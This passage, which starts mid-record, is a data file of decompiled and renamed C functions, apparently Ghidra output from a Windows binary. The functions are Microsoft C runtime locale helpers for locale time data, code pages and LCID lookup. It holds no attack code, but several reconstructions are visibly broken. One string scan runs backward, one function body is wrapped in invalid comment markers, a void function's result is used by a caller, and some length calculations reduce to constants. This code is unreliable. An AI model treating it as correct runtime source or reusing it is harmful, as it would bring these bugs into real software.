(wchar_t **)(param_1 + 0x98)); \n    localeInfoResult2 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, 0x29, (wchar_t **)(param_1 + 0x9c)); \n    localeInfoResult3 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, 0x28, (wchar_t **)(param_1 + 0x14c)); \n    localeInfoResult10 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, 0x29, (wchar_t **)(param_1 + 0x150)); \n    localeIndex = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, 0x1f, (wchar_t **)(param_1 + 0xa0)); \n    localeInfoResult4 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, 0x20, (wchar_t **)(param_1 + 0xa4)); \n    localeInfoResult5 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, 0x1003, (wchar_t **)(param_1 + 0xa8)); \n    localeInfoResult6 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 0, localeInfoPointer, 0x1009, (wchar_t **)(param_1 + 0xac)); \n    localeInfoResult7 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, 0x1f, (wchar_t **)(param_1 + 0x154)); \n    localeInfoResult8 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, 0x20, (wchar_t **)(param_1 + 0x158)); \n    localeInfoResult9 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, 0x1003, (wchar_t **)(param_1 + 0x15c)); \n    \n    return (bool)('\\x01' - ((localeInfoResult9 | accumulatedResult | localeInfoResult1 | localeInfoResult2 | localeInfoResult3 | localeInfoResult10 | localeIndex | localeInfoResult4 | localeInfoResult5 | localeInfoResult6 | localeInfoResult7 | localeInfoResult8) != 0));\n}"}
{"Function Name": "___acrt_locale_free_time", "Address": "10033e46", "Source Code": "void __cdecl ___acrt_locale_free_time(void **locale_array)\n{\n    \n    if (locale_array != (void **)0x0) {\n        \n        free_crt_array_internal(locale_array, 7);\n        \n        free_crt_array_internal(locale_array + 7, 7);\n        \n        free_crt_array_internal(locale_array + 0xe, 0xc);\n        \n        free_crt_array_internal(locale_array + 0x1a, 0xc);\n        \n        free_crt_array_internal(locale_array + 0x26, 2);\n        \n        FID_conflict__free(locale_array[0x28]);\n        \n        FID_conflict__free(locale_array[0x29]);\n        \n        FID_conflict__free(locale_array[0x2a]);\n        \n        free_crt_array_internal(locale_array + 0x2d, 7);\n        \n        free_crt_array_internal(locale_array + 0x34, 7);\n        \n        free_crt_array_internal(locale_array + 0x3b, 0xc);\n        \n        free_crt_array_internal(locale_array + 0x47, 0xc);\n        \n        free_crt_array_internal(locale_array + 0x53, 2);\n        \n        FID_conflict__free(locale_array[0x55]);\n        \n        FID_conflict__free(locale_array[0x56]);\n        \n        FID_conflict__free(locale_array[0x57]);\n        \n        FID_conflict__free(locale_array[0x58]);\n    }\n}"}
{"Function Name": "___acrt_locale_initialize_time", "Address": "10033f2a", "Source Code": "undefined4 __cdecl ___acrt_locale_initialize_time(__crt_locale_data *locale_data)\n{\n    undefined **allocated_memory; \n    \n    if (*(int *)(locale_data + 0xb4) == 0) {\n        allocated_memory = &default_pointer; \n        goto LAB_10033f91; \n    } else {\n        \n        allocated_memory = (undefined **)allocate_memory(1, 0x164);\n        if (allocated_memory == (undefined **)0x0) { \n            free_memory((void *)0x0); \n        } else {\n            \n            if (init_locale_time((__crt_lc_time_data *)allocated_memory, locale_data)) {\n                allocated_memory[0x2c] = (undefined *)0x1; \n                free_memory((void *)0x0); \n                goto LAB_10033f91; \n            }\n            \n            free_locale_time(allocated_memory);\n            free_memory(allocated_memory); \n        }\n    }\n    return 1; \nLAB_10033f91:\n    \n    release_locale_time_reference(*(undefined ***)(locale_data + 0x9c));\n    *(undefined ***)(locale_data + 0x9c) = allocated_memory; \n    return 0; \n}"}
{"Function Name": "_wcscspn", "Address": "10033fa9", "Source Code": "size_t __cdecl _wcscspn(wchar_t *inputString, wchar_t *controlString)\n{\n    wchar_t *inputPtr = inputString; \n    wchar_t *controlPtr;        \n    if (*inputString != L'\\0') { \n        do {\n            if (*controlString != L'\\0') { \n                controlPtr = controlString; \n                do {\n                    if (*inputPtr == *controlPtr) \n                        goto LAB_10033fee; \n                    controlPtr++; \n                } while (*controlPtr != L'\\0'); \n            }\n            inputPtr++; \n        } while (*inputPtr != L'\\0'); \n    }\nLAB_10033fee: \n    return (size_t)(inputPtr - inputString); \n}"}
{"Function Name": "_wcspbrk", "Address": "10033ff9", "Source Code": "\\*\nwchar_t * __cdecl _wcspbrk(wchar_t *inputString, wchar_t *controlString)\n{\n    wchar_t *controlCharPointer; \n    while (*inputString != L'\\0') { \n        controlCharPointer = controlString; \n        while (*controlCharPointer != L'\\0') { \n            if (*controlCharPointer == *inputString) { \n                return inputString; \n            }\n            controlCharPointer++; \n        }\n        inputString++; \n    }\n    return (wchar_t *)0x0; \n}\n*\\ \n \nwchar_t * __cdecl _wcspbrk(wchar_t *inputString, wchar_t *controlString)\n{\n    wchar_t *controlCharPointer;\n    while (*inputString != L'\\0') {\n        controlCharPointer = controlString;\n        while (*controlCharPointer != L'\\0') {\n            if (*controlCharPointer == *inputString) {\n                return inputString;\n            }\n            controlCharPointer++;\n        }\n        inputString++;\n    }\n    return (wchar_t *)0x0;\n}"}
{"Function Name": "_GetLocaleNameFromDefault", "Address": "1003403e", "Source Code": "void __cdecl _GetLocaleNameFromDefault(int param_1)\n{\n    wchar_t currentChar; \n    wchar_t localeName; \n    wchar_t *localeNamePtr; \n    uint securityCookie; \n    \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    *(uint *)(param_1 + 8) |= 0x104;\n    \n    \n    int result = FUN_1002d2de(&localeName, 0x55);\n    \n    \n    if (result > 1) {\n        localeNamePtr = &localeName; \n        \n        \n        while ((currentChar = *localeNamePtr) != L'\\0') {\n            localeNamePtr++; \n        }\n        \n        \n        result = FUN_10025329((wchar_t *)(param_1 + 0x250), 0x55, &localeName, ((int)localeNamePtr - (int)&localeName >> 1) + 1);\n        \n        \n        if (result != 0) {\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    }\n    \n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    \n    return; \n}"}
{"Function Name": "_GetLocaleNameFromLangCountry", "Address": "100340c7", "Source Code": "void __cdecl _GetLocaleNameFromLangCountry(ushort **localeStrings)\n{\n    \n    ushort *stringEnd1 = *localeStrings + 1;\n    \n    while (*(--stringEnd1) != 0);\n    \n    localeStrings[4] = (ushort *)(uint)((int)stringEnd1 - (int)(*localeStrings + 1) >> 1 == 3);\n    \n    ushort *stringEnd2 = localeStrings[1] + 1;\n    \n    while (*(--stringEnd2) != 0);\n    \n    localeStrings[5] = (ushort *)(uint)((int)stringEnd2 - (int)(localeStrings[1] + 1) >> 1 == 3);\n    \n    localeStrings[3] = (localeStrings[4] == (ushort *)0x0) ? (ushort *)_GetPrimaryLen(*localeStrings) : (ushort *)0x2;\n    \n    FUN_1002d0d4(_LangCountryEnumProcEx_12, 3, 0, (void *)0x0);\n    \n    \n    if (((uint)localeStrings[2] >> 8 & 1) == 0 || (((uint)localeStrings[2] & 7) == 0 || ((uint)localeStrings[2] >> 9 & 1) == 0)) {\n        localeStrings[2] = (ushort *)0x0; \n    }\n}"}
{"Function Name": "_GetLocaleNameFromLanguage", "Address": "10034161", "Source Code": "void __cdecl _GetLocaleNameFromLanguage(ushort **localeNamePtr)\n{\n    ushort *localeNameStart = *localeNamePtr; \n    ushort *localeNameEnd = localeNameStart + 1; \n    \n    while (*localeNameStart != 0) {\n        localeNameStart++; \n    }\n    \n    \n    localeNameEnd = (ushort *)(uint)((int)localeNameStart - (int)localeNameEnd >> 1 == 3);\n    localeNamePtr[4] = localeNameEnd; \n    \n    if (localeNameEnd == (ushort *)0x0) {\n        localeNamePtr[3] = (ushort *)_GetPrimaryLen(*localeNamePtr); \n    } else {\n        localeNamePtr[3] = (ushort *)0x2; \n    }\n    \n    FUN_1002d0d4(_LanguageEnumProcEx_12, 3, 0, (void *)0x0);\n    \n    \n    if ((*(byte *)(localeNamePtr + 2) & 4) == 0) {\n        localeNamePtr[2] = (ushort *)0x0; \n    }\n}"}
{"Function Name": "_GetPrimaryLen", "Address": "100341bc", "Source Code": "int __cdecl _GetPrimaryLen(ushort *input_pointer)\n{\n    int valid_character_count = 0; \n    if (input_pointer == (ushort *)0x0) { \n        return 0; \n    }\n    while (true) { \n        ushort current_character = *input_pointer++; \n        \n        if (((current_character < 0x41) || (0x5a < current_character)) && (0x19 < (ushort)(current_character - 0x61))) break; \n        valid_character_count++; \n    }\n    return valid_character_count; \n}"}
{"Function Name": "_LanguageEnumProcEx@12", "Address": "100344da", "Source Code": "void _LanguageEnumProcEx_12(wchar_t *inputString) \n{\n    __acrt_ptd *threadLocalStoragePtr; \n    int returnValue; \n    wchar_t wideCharBuffer[120]; \n    uint securityCheckValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    threadLocalStoragePtr = FUN_10029224(); \n    returnValue = FUN_1002d288(inputString, (-(uint)(*(int *)(threadLocalStoragePtr + 0x60) != 0) & 0xfffff002) + 0x1001, wideCharBuffer, 0x78); \n    if (returnValue == 0) { \n        *(undefined4 *)(threadLocalStoragePtr + 0x58) = 0; \n    } else {\n        returnValue = FUN_100249c3(*(wchar_t **)(threadLocalStoragePtr + 0x50), wideCharBuffer); \n        if (returnValue == 0) { \n            wchar_t *charPointer = inputString; \n            while (*charPointer != L'\\0') { \n                charPointer++; \n            }\n            returnValue = FUN_10025329((wchar_t *)(threadLocalStoragePtr + 0x2a0), 0x55, inputString, ((int)charPointer - (int)(inputString + 1) >> 1) + 1); \n            if (returnValue != 0) { \n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n            }\n            *(uint *)(threadLocalStoragePtr + 0x58) |= 4; \n        }\n    }\n    ___security_check_cookie_4(securityCheckValue ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "_ProcessCodePage", "Address": "1003459b", "Source Code": "UINT __cdecl _ProcessCodePage(wchar_t *inputString, int codePage)\n{\n    uint ocpComparisonResult = 0; \n    UINT returnValue; \n    uint acpComparisonResult; \n    wchar_t *inputPointer; \n    wchar_t *comparisonPointer; \n    bool unusedBoolean; \n    UINT resultFromFunction; \n    \n    if (inputString != (wchar_t *)0x0 && *inputString != L'\\0') {\n        comparisonPointer = L\"ACP\"; \n        inputPointer = inputString; \n        do {\n            \n            if (*inputPointer != *comparisonPointer) {\n                acpComparisonResult = (ushort)*inputPointer < (ushort)*comparisonPointer ? 1 : 0; \n                goto check_OCP; \n            }\n            if (*inputPointer == L'\\0') break; \n            if (inputPointer[1] != comparisonPointer[1]) {\n                acpComparisonResult = (ushort)inputPointer[1] < (ushort)comparisonPointer[1] ? 1 : 0; \n                goto check_OCP; \n            }\n            inputPointer += 2; \n            comparisonPointer += 2; \n        } while (*inputPointer != L'\\0'); \n        acpComparisonResult = 0; \n    }\ncheck_OCP:\n    \n    if (acpComparisonResult != 0) {\n        comparisonPointer = L\"OCP\"; \n        inputPointer = inputString; \n        do {\n            \n            if (*inputPointer != *comparisonPointer) {\n                ocpComparisonResult = (ushort)*inputPointer < (ushort)*comparisonPointer ? 1 : 0; \n                break; \n            }\n            if (*inputPointer == L'\\0') break; \n            if (inputPointer[1] != comparisonPointer[1]) {\n                ocpComparisonResult = (ushort)inputPointer[1] < (ushort)comparisonPointer[1] ? 1 : 0; \n                break; \n            }\n            inputPointer += 2; \n            comparisonPointer += 2; \n        } while (*inputPointer != L'\\0'); \n        \n        if (ocpComparisonResult != 0) {\n            return __wtol(inputString); \n        }\n    }\n    \n    int functionCallResult = FUN_1002d288((wchar_t *)(codePage + 0x250), ocpComparisonResult ? 0x20001004 : 0x2000000b, (wchar_t *)&resultFromFunction, 2);\n    if (functionCallResult == 0) {\n        return 0; \n    }\n    return resultFromFunction ? resultFromFunction : GetACP(); \n}"}
{"Function Name": "_TestDefaultCountry", "Address": "10034682", "Source Code": "void __cdecl _TestDefaultCountry(wchar_t *inputString)\n{\n    wchar_t countryCodeArray[10]; \n    \n    \n    if (FUN_1002d288(inputString, 0x59, countryCodeArray, 9) != 0) {\n        \n        _wcsncmp(countryCodeArray, inputString, 9);\n    }\n    return; \n}"}
{"Function Name": "_TranslateName", "Address": "100346cd", "Source Code": "bool __cdecl _TranslateName(int base_address, int upper_bound, wchar_t **output_name)\n{\n    int comparison_result = 1; \n    int lower_bound = 0; \n    if (upper_bound > -1) { \n        do {\n            if (comparison_result == 0) break; \n            int middle_index = (lower_bound + upper_bound) / 2; \n            comparison_result = FUN_100249c3(*output_name, *(wchar_t **)(middle_index * 0xc + base_address)); \n            if (comparison_result == 0) { \n                *output_name = (wchar_t *)(middle_index * 0xc + base_address + 4); \n            } else if (comparison_result < 0) { \n                upper_bound = middle_index - 1; \n            } else { \n                lower_bound = middle_index + 1; \n            }\n        } while (lower_bound <= upper_bound); \n    }\n    return comparison_result == 0; \n}"}
{"Function Name": "___acrt_get_qualified_locale", "Address": "1003473c", "Source Code": "undefined4 __cdecl ___acrt_get_qualified_locale(wchar_t *param_1, UINT *param_2, wchar_t *param_3)\n{\n    wchar_t **localePointer1; \n    wchar_t **localePointer2; \n    wchar_t *localeNameBuffer;   \n    wchar_t *localeOutputBuffer;   \n    wchar_t localeChar;     \n    bool isTranslated;        \n    __acrt_ptd *threadLocalData; \n    UINT codePageValue;         \n    BOOL isValidCodePage;        \n    int functionReturnValue;         \n    ushort *ushortPointer;   \n    wchar_t *currentCharPointer;  \n    threadLocalData = FUN_10029224(); \n    localePointer1 = (wchar_t **)(threadLocalData + 0x50); \n    localeNameBuffer = (wchar_t *)(threadLocalData + 0x2a0); \n    *(undefined4 *)(threadLocalData + 0x58) = 0; \n    *localeNameBuffer = L'\\0'; \n    localePointer2 = (wchar_t **)(threadLocalData + 0x54); \n    *localePointer1 = param_1; \n    *localePointer2 = param_1 + 0x40; \n    if (param_1[0x40] != L'\\0') { \n        _TranslateName(0x100414c8, 0x16, localePointer2); \n    }\n    if (**localePointer1 == L'\\0') { \n        _GetLocaleNameFromDefault((int)localePointer1); \n    } else {\n        if (**localePointer2 == L'\\0') { \n            _GetLocaleNameFromLanguage((ushort **)localePointer1); \n        } else {\n            _GetLocaleNameFromLangCountry((ushort **)localePointer1); \n        }\n        if ((*(int *)(threadLocalData + 0x58) == 0) && (isTranslated = _TranslateName(0x100411b8, 0x40, localePointer1), isTranslated != 0)) {\n            \n            if (**localePointer2 == L'\\0') {\n                _GetLocaleNameFromLanguage((ushort **)localePointer1); \n            } else {\n                _GetLocaleNameFromLangCountry((ushort **)localePointer1); \n            }\n        }\n    }\n    if ((*(int *)(threadLocalData + 0x58) != 0) && ((codePageValue = _ProcessCodePage(param_1 + 0x80, (int)localePointer1), codePageValue != 0) && (codePageValue != 65000) && (codePageValue != 0xfde9 && (isValidCodePage = IsValidCodePage(codePageValue & 0xffff), isValidCodePage != 0)))) {\n        \n        if (param_2 != (UINT *)0x0) { \n            *param_2 = codePageValue; \n        }\n        if (param_3 == (wchar_t *)0x0) { \n            return 1; \n        }\n        localeOutputBuffer = param_3 + 0x90; \n        *localeOutputBuffer = L'\\0'; \n        currentCharPointer = localeNameBuffer; \n        while (*currentCharPointer != L'\\0') { \n            currentCharPointer++; \n        }\n        functionReturnValue = FUN_10025329(localeOutputBuffer, 0x55, localeNameBuffer, ((int)currentCharPointer - (int)(threadLocalData + 0x2a2) >> 1) + 1); \n        if (functionReturnValue != 0) { \n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n        }\n        functionReturnValue = FUN_1002d288(localeOutputBuffer, 0x1001, param_3, 0x40); \n        if (functionReturnValue != 0) { \n            localeNameBuffer = param_3 + 0x40; \n            functionReturnValue = FUN_1002d288(param_3 + 0x90, 0x1002, localeNameBuffer, 0x40); \n            if ((functionReturnValue != 0) && ((ushortPointer = FUN_1003791b((ushort *)localeNameBuffer, 0x5f), ushortPointer == (ushort *)0x0 && (ushortPointer = FUN_1003791b((ushort *)localeNameBuffer, 0x2e), ushortPointer == (ushort *)0x0)) || (functionReturnValue = FUN_1002d288(param_3 + 0x90, 7, localeNameBuffer, 0x40), functionReturnValue != 0))) {\n                \n                __itow_s(codePageValue, param_3 + 0x80, 0x10, 10); \n                return 1; \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "_CountryEnumProc@4", "Address": "1003490b", "Source Code": "void _CountryEnumProc_4(ushort *localeHexString)\n{\n    uint *uintPointer; \n    __acrt_ptd *threadLocalData; \n    LCID localeId; \n    int returnValue; \n    WCHAR localeBuffer[120]; \n    threadLocalData = FUN_10029224(); \n    uintPointer = *(uint **)(threadLocalData + 0x34c); \n    localeId = _LcidFromHexString(localeHexString); \n    returnValue = GetLocaleInfoW(localeId, (-(uint)(*(int *)(threadLocalData + 100) != 0) & 0xfffff005) + 0x1002, localeBuffer, 0x78); \n    \n    if (returnValue == 0) { \n        *uintPointer = 0; \n    } else {\n        returnValue = FUN_100249c3(*(wchar_t **)(threadLocalData + 0x54), localeBuffer); \n        if ((returnValue == 0) && (returnValue = _TestDefaultCountry((short)localeId), returnValue != 0)) { \n            *uintPointer |= 4; \n            uintPointer[2] = localeId; \n            uintPointer[1] = localeId; \n        }\n    }\n    return; \n}"}
{"Function Name": "_GetLcidFromCountry", "Address": "100349b4", "Source Code": "void __cdecl _GetLcidFromCountry(undefined4 *country_param)\n{\n    short *locale_pointer; \n    __acrt_ptd *thread_local_data; \n    thread_local_data = FUN_10029224(); \n    locale_pointer = *(short **)(thread_local_data + 0x54); \n    while (*locale_pointer != 0) { \n        locale_pointer++; \n    }\n    \n    *(uint *)(thread_local_data + 100) = (uint)((int)locale_pointer - (int)(locale_pointer + 1) >> 1 == 3);\n    EnumSystemLocalesW(_CountryEnumProc_4, 1); \n    if ((*(byte *)country_param & 4) == 0) { \n        *country_param = 0; \n    }\n    return; \n}"}
{"Function Name": "_GetLcidFromLangCountry", "Address": "100349ff", "Source Code": "void __cdecl _GetLcidFromLangCountry(uint *lcidArray)\n{\n    short *primaryLangPtr; \n    short *countryPtr; \n    __acrt_ptd *threadLocalData; \n    uint lcidValue; \n    int primaryLangLength = 2; \n    threadLocalData = FUN_10029224(); \n    primaryLangPtr = *(short **)(threadLocalData + 0x50); \n    while (*primaryLangPtr++) {} \n    countryPtr = *(short **)(threadLocalData + 0x54); \n    *(uint *)(threadLocalData + 0x60) = (uint)((int)primaryLangPtr - (int)(primaryLangPtr - 1) >> 1 == 3); \n    while (*countryPtr++) {} \n    *(uint *)(threadLocalData + 100) = (uint)((int)countryPtr - (int)(countryPtr - 1) >> 1 == 3); \n    lcidArray[1] = 0; \n    if (*(int *)(threadLocalData + 0x60) == 0) { \n        primaryLangLength = _GetPrimaryLen(*(ushort **)(threadLocalData + 0x50)); \n    }\n    *(int *)(threadLocalData + 0x5c) = primaryLangLength; \n    EnumSystemLocalesW(_LangCountryEnumProc_4, 1); \n    lcidValue = *lcidArray; \n    if ((lcidValue >> 8 & 1) == 0 || ((lcidValue & 7) == 0 || (lcidValue >> 9 & 1) == 0)) { \n        *lcidArray = 0; \n    }\n}"}
{"Function Name": "_GetLcidFromLanguage", "Address": "10034a9a", "Source Code": "void __cdecl _GetLcidFromLanguage(undefined4 *languageParam)\n{\n    __acrt_ptd *threadLocalData; \n    uint lcid; \n    int primaryLanguageLength; \n    threadLocalData = FUN_10029224(); \n    primaryLanguageLength = 2; \n    short *languageStringPointer = *(short **)(threadLocalData + 0x50); \n    \n    \n    while (*languageStringPointer != 0) {\n        languageStringPointer++; \n    }\n    \n    \n    lcid = (uint)((int)languageStringPointer - (int)(*(short **)(threadLocalData + 0x50) + 1) >> 1 == 3);\n    *(uint *)(threadLocalData + 0x60) = lcid; \n    \n    if (lcid == 0) {\n        primaryLanguageLength = _GetPrimaryLen(*(ushort **)(threadLocalData + 0x50)); \n    }\n    \n    *(int *)(threadLocalData + 0x5c) = primaryLanguageLength; \n    EnumSystemLocalesW(_LanguageEnumProc_4, 1); \n    \n    if ((*(byte *)languageParam & 4) == 0) {\n        *languageParam = 0; \n    }\n}"}
{"Function Name": "_GetPrimaryLen", "Address": "10034afb", "Source Code": "int __cdecl _GetPrimaryLen(ushort *sequence) \n{\n    int length = 0; \n    ushort currentChar; \n    while (true) { \n        currentChar = *sequence++; \n        \n        if (((currentChar < 0x41) || (0x5A < currentChar)) && (0x19 < (ushort)(currentChar - 0x61))) break; \n        length++; \n    }\n    return length; \n}"}
{"Function Name": "_LanguageEnumProc@4", "Address": "10034d77", "Source Code": "void _LanguageEnumProc_4(ushort *localeHexString)\n{\n    uint *localeInfoPointer; \n    __acrt_ptd *threadLocalStoragePointer; \n    LCID localeIdentifier; \n    int returnValue; \n    WCHAR localeBuffer[120]; \n    localeInfoPointer = *(uint **)(FUN_10029224() + 0x34c); \n    localeIdentifier = _LcidFromHexString(localeHexString); \n    returnValue = GetLocaleInfoW(localeIdentifier, (-(uint)(*(int *)(FUN_10029224() + 0x60) != 0) & 0xfffff002) + 0x1001, localeBuffer, 0x78); \n    \n    if (returnValue == 0) { \n        *localeInfoPointer = 0; \n        return; \n    }\n    \n    returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer); \n    if (returnValue == 0 && *(int *)(FUN_10029224() + 0x60) == 0) { \n        returnValue = 1; \n    } else if ((*(int *)(FUN_10029224() + 0x60) != 0 || *(int *)(FUN_10029224() + 0x5c) == 0) && (returnValue = FUN_100249c3(*(wchar_t **)(FUN_10029224() + 0x50), localeBuffer), returnValue != 0)) { \n        *localeInfoPointer = 0; \n        return; \n    } else {\n        returnValue = _TestDefaultLanguage(localeIdentifier, returnValue); \n        if (returnValue == 0) { \n            *localeInfoPointer = 0; \n            return; \n        }\n    }\n    \n    *localeInfoPointer |= 4; \n    localeInfoPointer[1] = localeIdentifier; \n    localeInfoPointer[2] = localeIdentifier; \n    return; \n}"}
{"Function Name": "_LcidFromHexString", "Address": "10034e4f", "Source Code": "int __cdecl _LcidFromHexString(ushort *hex_string)\n{\n    int result = 0; \n    ushort current_char; \n    \n    while ((current_char = *hex_string) != 0) {\n        hex_string++; \n        \n        if ((ushort)(current_char - 0x61) < 6) {\n            current_char -= 0x27; \n        } \n        \n        else if ((ushort)(current_char - 0x41) < 6) {\n            current_char -= 7; \n        }\n        \n        result = result * 0x10 + (current_char - 0x30);\n    }\n    return result; \n}"}
{"Function Name": "_ProcessCodePage", "Address": "10034ea0", "Source Code": "UINT __cdecl _ProcessCodePage(wchar_t *inputString, int localeId)\n{\n    wchar_t currentChar; \n    uint comparisonResult = 0; \n    UINT unusedVar; \n    UINT localeInfo; \n    \n    if (inputString != (wchar_t *)0x0 && *inputString != L'\\0') {\n        wchar_t *inputPtr = inputString; \n        wchar_t *comparisonPtr = L\"ACP\"; \n        \n        \n        do {\n            currentChar = *inputPtr; \n            \n            if (currentChar != *comparisonPtr) {\n                comparisonResult = (ushort)currentChar < (ushort)*comparisonPtr ? 1 : 0; \n                break; \n            }\n            if (currentChar == L'\\0') break; \n            currentChar = inputPtr[1]; \n            \n            if (currentChar != comparisonPtr[1]) {\n                comparisonResult = (ushort)currentChar < (ushort)comparisonPtr[1] ? 1 : 0; \n                break; \n            }\n            inputPtr += 2; \n            comparisonPtr += 2; \n        } while (currentChar != L'\\0'); \n        \n        if (comparisonResult != 0) {\n            comparisonPtr = L\"OCP\"; \n            inputPtr = inputString; \n            \n            do {\n                currentChar = *inputPtr; \n                \n                if (currentChar != *comparisonPtr) {\n                    comparisonResult = (ushort)currentChar < (ushort)*comparisonPtr ? 1 : 0; \n                    break; \n                }\n                if (currentChar == L'\\0') break; \n                currentChar = inputPtr[1]; \n                \n                if (currentChar != comparisonPtr[1]) {\n                    comparisonResult = (ushort)currentChar < (ushort)comparisonPtr[1] ? 1 : 0; \n                    break; \n                }\n                inputPtr += 2; \n                comparisonPtr += 2; \n            } while (currentChar != L'\\0'); \n            \n            if (comparisonResult != 0) {\n                return __wtol(inputString); \n            }\n            \n            if (GetLocaleInfoW(*(LCID *)(localeId + 8), 0x2000000b, (LPWSTR)&localeInfo, 2) == 0) {\n                return 0; \n            }\n            return localeInfo; \n        }\n    }\n    \n    if (GetLocaleInfoW(*(LCID *)(localeId + 8), 0x20001004, (LPWSTR)&localeInfo, 2) == 0) {\n        return 0; \n    }\n    \n    if (localeInfo == 0) {\n        return GetACP(); \n    }\n    return localeInfo; \n}"}
{"Function Name": "_TestDefaultCountry", "Address": "10034f83", "Source Code": "undefined4 __cdecl _TestDefaultCountry(short countryCode)\n{\n    \n    for (uint index = 0; index < 0x14; index += 2) {\n        \n        if (countryCode == *(short *)((int)&DAT_100415f0 + index)) {\n            \n            return 0;\n        }\n    }\n    \n    return 1;\n}"}
{"Function Name": "_TestDefaultLanguage", "Address": "10034fa7", "Source Code": "undefined4 __cdecl _TestDefaultLanguage(uint param_1, int param_2)\n{\n    __acrt_ptd *thread_data_pointer; \n    int locale_info_result; \n    undefined4 unused_variable; \n    short *locale_info_pointer; \n    uint locale_info_value; \n    thread_data_pointer = FUN_10029224(); \n    locale_info_result = GetLocaleInfoW(param_1 & 0x3ff | 0x400, 0x20000001, (LPWSTR)&locale_info_value, 2); \n    if (locale_info_result == 0) { \n        return 0; \n    } else {\n        if ((param_1 != locale_info_value) && (param_2 != 0)) { \n            locale_info_pointer = *(short **)(thread_data_pointer + 0x50); \n            if (_GetPrimaryLen(locale_info_pointer) == (int)(locale_info_pointer + 1) - (int)locale_info_pointer >> 1) { \n                return 0; \n            }\n        }\n        return 1; \n    }\n}"}
{"Function Name": "_TranslateName", "Address": "10035017", "Source Code": "uint __cdecl _TranslateName(int base_address, int upper_bound, wchar_t **name_pointer)\n{\n    uint comparison_result; \n    int lower_bound = 0; \n    if (-1 < upper_bound) { \n        do {\n            int middle_index = (lower_bound + upper_bound) / 2; \n            comparison_result = FUN_100249c3(*name_pointer, *(wchar_t **)(middle_index * 0xc + base_address)); \n            if (comparison_result == 0) { \n                *name_pointer = (wchar_t *)(middle_index * 0xc + base_address + 4); \n                return 1; \n            }\n            if ((int)comparison_result < 0) { \n                upper_bound = middle_index - 1; \n            } else { \n                lower_bound = middle_index + 1; \n            }\n        } while (lower_bound <= upper_bound); \n    }\n    return comparison_result & 0xffffff00; \n}"}
{"Function Name": "___acrt_get_qualified_locale_downlevel", "Address": "10035074", "Source Code": "void __cdecl ___acrt_get_qualified_locale_downlevel(wchar_t *localeString, UINT *localeCodePage, LPWSTR localeInfo)\n{\n    wchar_t **threadLocaleStringPtr; \n    wchar_t *offsetStringPtr;   \n    __acrt_ptd *threadLocalDataPtr; \n    __acrt_ptd *anotherThreadLocalDataPtr; \n    uint localeIdentifier = 0;  \n    LCID defaultLocaleIdentifier = 0;  \n    LCID anotherLocaleIdentifier = 0;   \n    UINT codePageValue;          \n    BOOL isValidResult;        \n    threadLocalDataPtr = FUN_10029224(); \n    wchar_t **threadLocaleStringPtrOffset = (wchar_t **)(threadLocalDataPtr + 0x50); \n    offsetStringPtr = localeString + 0x40; \n    *threadLocaleStringPtrOffset = localeString; \n    threadLocaleStringPtr = (wchar_t **)(threadLocalDataPtr + 0x54); \n    *threadLocaleStringPtr = offsetStringPtr; \n    \n    if ((offsetStringPtr != (wchar_t *)0x0) && (*offsetStringPtr != L'\\0')) {\n        _TranslateName(0x100414c8, DAT_100415dc + -1, threadLocaleStringPtr); \n    }\n    \n    if ((*threadLocaleStringPtrOffset == (wchar_t *)0x0) || (**threadLocaleStringPtrOffset == L'\\0')) {\n        \n        if ((*threadLocaleStringPtr == (wchar_t *)0x0) || (**threadLocaleStringPtr == L'\\0')) {\n            localeIdentifier = 0x104; \n            defaultLocaleIdentifier = GetUserDefaultLCID(); \n            anotherLocaleIdentifier = defaultLocaleIdentifier; \n        } else {\n            _GetLcidFromCountry(&localeIdentifier); \n        }\n    } else {\n        \n        if ((*threadLocaleStringPtr == (wchar_t *)0x0) || (**threadLocaleStringPtr == L'\\0')) {\n            _GetLcidFromLanguage(&localeIdentifier); \n        } else {\n            _GetLcidFromLangCountry(&localeIdentifier); \n        }\n        \n        if (localeIdentifier == 0) {\n            uint translationResult = _TranslateName(0x100411b8, DAT_100414c4 + -1, threadLocaleStringPtrOffset); \n            if ((char)translationResult != '\\0') { \n                \n                if ((*threadLocaleStringPtr == (wchar_t *)0x0) || (**threadLocaleStringPtr == L'\\0')) {\n                    _GetLcidFromLanguage(&localeIdentifier); \n                } else {\n                    _GetLcidFromLangCountry(&localeIdentifier); \n                }\n            }\n        }\n    }\n    \n    codePageValue = _ProcessCodePage((wchar_t *)(-(uint)(localeString != (wchar_t *)0x0) & (uint)(localeString + 0x80)), (int)&localeIdentifier);\n    \n    \n    if ((((codePageValue != 0) && (codePageValue != 65000)) && (codePageValue != 0xfde9)) &&\n        (isValidResult = IsValidCodePage(codePageValue & 0xffff), isValidResult != 0 &&\n        (isValidResult = IsValidLocale(defaultLocaleIdentifier, 1), isValidResult != 0))) {\n        \n        \n        if (localeCodePage != (UINT *)0x0) {\n            *localeCodePage = codePageValue;\n        }\n        \n        \n        FUN_1002d3e2(defaultLocaleIdentifier, 